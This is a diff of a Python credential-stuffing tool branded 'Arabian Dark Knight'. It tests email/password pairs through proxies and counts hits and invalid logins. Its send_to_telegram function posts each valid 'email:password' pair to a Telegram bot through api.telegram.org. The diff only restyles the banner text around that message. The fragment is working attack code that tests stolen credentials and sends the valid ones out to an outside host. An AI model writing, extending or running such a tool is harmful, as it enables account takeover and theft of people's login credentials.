@@ -54,12 +54,11 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file):
     console.print(Panel(f"Hits: {hits_count}  Invalid: {invalid_count}", title="Results"))
 
 def send_to_telegram(email, password):
-    message = f"""
-                                  THX FOR USE MY TOOL
-                                  Arabian Dark Knight
-                                  BY MASA THE GODFATHER
-                                  t.me/ArabianDarkKnight
-    Valid Acc : {email}:{password}
+    message = f""" 
+Arabian Dark Knight  { @ArabianDarkKnight - @DarkKnightArabian }
+
+
+Valid Acc : {email}:{password}
     """
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
@@ -116,3 +115,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
